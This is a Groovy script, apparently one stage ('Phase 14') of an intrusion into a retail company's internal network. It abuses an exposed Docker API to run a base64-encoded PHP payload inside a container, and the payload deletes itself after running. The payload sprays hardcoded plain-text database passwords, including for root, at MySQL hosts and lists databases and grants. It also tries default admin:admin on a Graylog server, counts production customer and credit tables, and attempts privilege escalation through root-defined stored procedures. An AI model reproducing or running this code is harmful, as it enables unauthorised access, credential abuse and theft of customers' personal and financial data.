// Phase 14: dbsears 172.27.140.134 + 172.27.141.5 auth + final summary
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(90000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def php = '''<?php
error_reporting(E_ALL);
ini_set("display_errors","1");

echo "===== [1] dbsears (172.27.140.134:3306) AUTH TESTS =====\\n";
$creds = array(
    array("adaxxidb", "JTQ6PrkecY3y1kVN"),
    array("apifincadodev", "1q2w3e4r5t6y"),
    array("apifincadob", "nNzy]Ku2Ah=u%y1I"),
    array("root", "JTQ6PrkecY3y1kVN"),
    array("dbgarzas", "JenkisLegasy25"),
);
foreach ($creds as $c) {
    list($user, $pass) = $c;
    $m = @new mysqli("172.27.140.134", $user, $pass, "", 3306);
    if (!$m->connect_error) {
        echo "*** AUTH_OK *** $user@172.27.140.134:3306\\n";
        $r = $m->query("SELECT VERSION(), CURRENT_USER(), @@hostname, @@port");
        $row = $r->fetch_row();
        echo "  VER=$row[0] CU=$row[1] HN=$row[2] PORT=$row[3]\\n";
        $r = $m->query("SHOW DATABASES"); 
        echo "  DATABASES:\\n";
        while ($row = $r->fetch_row()) { echo "    $row[0]\\n"; }
        $r = $m->query("SHOW GRANTS FOR CURRENT_USER()");
        echo "  GRANTS:\\n";
        while ($row = $r->fetch_row()) { echo "    $row[0]\\n"; }
        $m->close();
        break;
    } else {
        $msg = $m->connect_error;
        if (strpos($msg, "Access denied") !== false) echo "DENY|$user\\n";
        else { echo "ERR|$user|$msg\\n"; break; }
    }
}

echo "\\n===== [2] GRAYLOG (172.27.140.162:9000) =====\\n";
$ch = curl_init("http://172.27.140.162:9000/");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$resp = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
echo "HTTP $code | ".substr($resp, 0, 200)."\\n";

// Try default graylog creds
$ch = curl_init("http://172.27.140.162:9000/api/system");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
curl_setopt($ch, CURLOPT_USERPWD, "admin:admin");
$resp = curl_exec($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
echo "Graylog API admin:admin -> HTTP $code | ".substr($resp, 0, 200)."\\n";

echo "\\n===== [3] FINAL PROD SEARS MYSQL via 172.27.140.134 =====\\n";
// If 134 is dbsears, check if it has the same data as PROD
$m = @new mysqli("172.27.140.134", "adaxxidb", "JTQ6PrkecY3y1kVN", "tienda", 3306);
if (!$m->connect_error) {
    // Check if this is PROD by looking at recent orders
    $r = $m->query("SELECT COUNT(*) cnt FROM tienda.pedidos WHERE Fecha_Inicio >= '2026-08-01'");
    if ($r) { $row = $r->fetch_assoc(); echo "PEDIDOS_AGO2026: ".$row["cnt"]."\\n"; }
    
    // Check TABLE_ROWS for key tables
    $r = $m->query("SELECT TABLE_NAME, TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='tienda' AND TABLE_NAME IN ('pedidos','clientes','datos_clientes','credito_clarotel_credcliente') ORDER BY TABLE_ROWS DESC");
    if ($r) { while ($row = $r->fetch_assoc()) { echo "  ".$row["TABLE_NAME"]." rows~".$row["TABLE_ROWS"]."\\n"; } }
    
    $m->close();
}

echo "\\n===== [4] DEV SEARS - STORED PROC EXECUTION (DEFINER privesc) =====\\n";
$m = new mysqli("172.27.141.6", "apifincadodev", "1q2w3e4r5t6y", "tienda", 3308);
if (!$m->connect_error) {
    // Try calling a stored proc with DEFINER=root@localhost
    echo "--- Calling sp_salescheck (DEFINER=root@localhost) ---\\n";
    $r = $m->query("CALL tienda.sp_salescheck()");
    if ($r) {
        echo "SP_OK rows=".$r->num_rows."\\n";
        while ($row = $r->fetch_row()) { echo "  ".implode("|", array_slice($row, 0, 5))."\\n"; }
        $r->free();
        // Drain remaining result sets
        while ($m->more_results()) { $m->next_result(); $r=$m->store_result(); if($r) $r->free(); }
    } else { echo "SP_ERR: ".$m->error."\\n"; }
    
    // Try sp_reporte_automatizado
    echo "\\n--- Trying sys.execute_prepared_stmt (INVOKER) ---\\n";
    $r = $m->query("CALL sys.execute_prepared_stmt('SELECT user,host FROM mysql.user LIMIT 5')");
    if ($r) {
        echo "SYS_EXEC_OK\\n";
        while ($row = $r->fetch_row()) { echo "  ".implode("|", $row)."\\n"; }
    } else { echo "SYS_EXEC_ERR: ".$m->error."\\n"; }
    
    $m->close();
}

echo "\\nPHASE14_COMPLETE\\n";
'''

def b64 = php.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p14.php && php /tmp/_p14.php 2>&1; rm -f /tmp/_p14.php"
println execIn(cmd)
